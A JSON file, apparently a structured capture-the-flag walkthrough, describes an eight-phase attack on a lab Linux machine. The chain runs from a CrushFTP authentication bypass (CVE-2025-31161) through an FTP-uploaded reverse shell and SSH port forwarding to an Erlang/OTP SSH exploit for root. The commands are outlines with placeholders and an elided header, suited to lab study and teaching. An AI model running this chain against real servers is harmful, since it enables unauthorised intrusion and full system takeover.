@@ -1,0 +1,117 @@
+{
+  "machine": {
+    "machine_name": "Soulmate",
+    "target_ip": "10.10.11.x",
+    "description": "Soulmate is an easy difficulty Linux machine featuring a multi-stage exploitation chain. An HTTP server hosts CrushFTP 11, which is vulnerable to CVE-2025-31161 authentication bypass. After creating an admin user, the attacker resets a privileged FTP user's password, uploads a reverse shell, and gains initial foothold. Local enumeration reveals a restricted SSH ForceCommand wrapper and an internal Erlang/OTP SSH service on 127.0.0.1:2222. Port forwarding exposes the service, which is exploited for root access.",
+    "vulnerabilities": [
+      "CrushFTP Authentication Bypass (CVE-2025-31161)",
+      "Password Reset via Admin Panel",
+      "Unrestricted File Upload via FTP",
+      "Erlang/OTP SSH RCE",
+      "SSH ForceCommand Information Disclosure"
+    ],
+    "tools": [
+      "Nmap",
+      "Gobuster",
+      "curl",
+      "FTP client",
+      "SSH port forwarding",
+      "linpeas"
+    ],
+    "techniques": [
+      "Virtual Host Discovery",
+      "CVE-Based Authentication Bypass",
+      "Credential Reuse / Password Reset",
+      "File Upload for RCE",
+      "Local Service Discovery",
+      "SSH Port Forwarding",
+      "Internal Service Exploitation"
+    ],
+    "os": "linux",
+    "cves": ["CVE-2025-31161"]
+  },
+  "sections": [
+    {
+      "title": "Phase 1 — Reconnaissance",
+      "content": "Discover open ports (22 SSH, 80 HTTP). HTTP redirects to soulmate.htb domain. Virtual host fuzzing reveals ftp.soulmate.htb.",
+      "commands": [
+        "nmap -sV -sC <target>",
+        "gobuster vhost -u http://<target> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain",
+        "echo '<target_ip> soulmate.htb ftp.soulmate.htb' >> /etc/hosts"
+      ]
+    },
+    {
+      "title": "Phase 2 — Application Enumeration",
+      "content": "CrushFTP 11 login panel found. Version fingerprinted as March 2025 build. CVE-2025-31161 identified as authentication bypass vulnerability.",
+      "commands": [
+        "curl -v http://soulmate.htb",
+        "curl -s http://soulmate.htb/WebInterface/login.html"
+      ]
+    },
+    {
+      "title": "Phase 3 — CVE Exploitation (Auth Bypass)",
+      "content": "CVE-2025-31161: CrushFTP auth bypass via crafted HTTP header. Creates admin user with arbitrary credentials.",
+      "commands": [
+        "curl -H 'Authorization: AWS4-HMAC-SHA256 ...' http://soulmate.htb/WebInterface/function/?command=setAdminUser&username=hacker&password=hacker123"
+      ]
+    },
+    {
+      "title": "Phase 4 — Privilege Abuse (Admin Panel)",
+      "content": "Use admin access to reset password of user with FTP write access. Upload webshell/reverse shell via FTP to web-accessible directory.",
+      "commands": [
+        "ftp ftp.soulmate.htb",
+        "put reverse_shell.php /webProd/reverse_shell.php"
+      ]
+    },
+    {
+      "title": "Phase 5 — Remote Code Execution",
+      "content": "Trigger uploaded reverse shell. Obtain shell as www-data.",
+      "commands": [
+        "curl http://soulmate.htb/reverse_shell.php",
+        "nc -lvnp 4444"
+      ]
+    },
+    {
+      "title": "Phase 6 — Local Enumeration",
+      "content": "Run linpeas. Discover SSH ForceCommand wrapper for user ben. Find Erlang SSH service on 127.0.0.1:2222. Discover hardcoded credentials.",
+      "commands": [
+        "linpeas.sh",
+        "cat /etc/ssh/sshd_config",
+        "ss -tlnp",
+        "cat /opt/wrapper.sh"
+      ]
+    },
+    {
+      "title": "Phase 7 — Port Forwarding",
+      "content": "Forward internal Erlang SSH port to attacker machine.",
+      "commands": [
+        "ssh -L 2222:127.0.0.1:2222 www-data@<target>"
+      ]
+    },
+    {
+      "title": "Phase 8 — Root Exploitation",
+      "content": "Exploit Erlang/OTP SSH RCE via port-forwarded service. Obtain root shell.",
+      "commands": [
+        "python3 erlang_ssh_rce.py -t 127.0.0.1 -p 2222",
+        "cat /root/root.txt"
+      ]
+    }
+  ],
+  "kill_chain": [
+    "Recon: nmap + vhost discovery",
+    "Enum: CrushFTP version fingerprint",
+    "CVE: CVE-2025-31161 auth bypass",
+    "Admin: password reset + FTP upload",
+    "RCE: reverse shell via uploaded file",
+    "Enum: linpeas + internal service discovery",
+    "Pivot: SSH port forward to 127.0.0.1:2222",
+    "Root: Erlang/OTP SSH RCE"
+  ],
+  "key_lessons": [
+    "Version fingerprinting drives CVE-based exploitation",
+    "Credentials are reusable across services",
+    "Internal services require port forwarding",
+    "ForceCommand wrappers leak service information",
+    "Multi-stage chains require stateful credential tracking"
+  ]
+}
